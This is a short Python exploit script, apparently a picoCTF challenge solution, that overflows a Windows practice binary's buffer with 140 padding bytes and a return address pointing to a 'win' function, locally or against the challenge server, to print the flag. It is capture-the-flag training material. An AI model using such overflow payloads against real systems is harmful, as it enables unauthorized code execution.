from pwintools import *
import sys

exe_path = './vuln.exe'

def conn():
    if sys.argv[1] == "LOCAL":
        r = Process(exe_path)
        r.spawn_debugger(breakin=False) # Seems to spawn a new, uncustomized workspace every time
        log.info("WinExec @ 0x{:x}".format(r.symbols['kernel32.dll']['WinExec']))

        # Other method
        # raw_input('>') # Delay so that we can attach to the process with WinDbg
        # r.recvuntil('ENTER')
    else:
        r = Remote("saturn.picoctf.net", 59880)

    return r



def main():
    r = conn()

    win_addr = 0x401530

    r.recvuntil(b'string!\r\n')
    r.sendline(b'A'*140 + p64(win_addr))

    print(r.recvuntil(b'}'))

if __name__ == "__main__":
    main()